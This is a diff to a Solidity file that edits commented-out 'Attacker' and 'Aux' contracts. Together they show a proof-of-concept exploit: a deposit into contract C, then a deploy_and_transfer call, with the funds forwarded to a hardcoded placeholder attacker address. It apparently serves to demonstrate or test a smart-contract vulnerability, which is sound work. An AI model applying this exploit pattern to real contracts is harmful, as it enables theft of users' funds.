@@ -34,12 +34,12 @@ contract C {
 // contract Attacker {
 //     bytes private create_aux_initcode;
 //     address private victim;
-//     constructor(bytes memory _create_aux_initcode, address _victim)  public {    // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
+//     constructor(bytes memory _create_aux_initcode, address _victim) payable public  {    // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
 //         create_aux_initcode = _create_aux_initcode;
 //         victim = _victim;
 //     }
 //     function attack() public {
-//         C(victim).deposit{value: 1000}();
+//         C(victim).deposit{value: 0.001 ether}();
 //         C(victim).deploy_and_transfer(create_aux_initcode);
 //     }
 //     function() external payable {
@@ -48,7 +48,8 @@ contract C {
 // }
 
 // contract Aux {
-//     constructor(address payable attacker) payable public  {
-//         attacker.transfer(msg.value);
+//     address attacker = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe; // "REPLACE HERE ATTACKER EOA ADDRESS";
+//     constructor() payable public  {
+//         (attacker).transfer(msg.value);
 //     }
 // }
